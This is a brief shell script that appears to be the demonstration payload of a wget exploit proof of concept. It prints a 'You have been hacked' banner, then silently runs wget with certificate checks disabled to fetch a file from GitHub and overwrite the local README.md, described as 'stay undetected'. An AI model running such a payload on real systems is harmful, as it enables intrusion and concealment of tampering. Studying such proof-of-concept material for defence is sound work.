echo
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo "!          You have been hacked           !" 
echo "!                                         !"
echo "! https://github.com/markus-perl/wget-pwn !"
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"

echo "
_____.___.             .__   ._._.
\__  |   | ____ _____  |  |__| | |
 /   |   |/ __ \\__  \ |  |  \ | |
 \____   \  ___/ / __ \|   Y  \|\|
 / ______|\___  >____  /___|  /___
 \/           \/     \/     \/\/\/
 "

echo "Done. Patching downloaded file to stay undetected ..."
echo ""
wget --no-check-certificate -q "https://raw.githubusercontent.com/markus-perl/wget-pwn/master/README.md" -O README.md 2>/dev/null

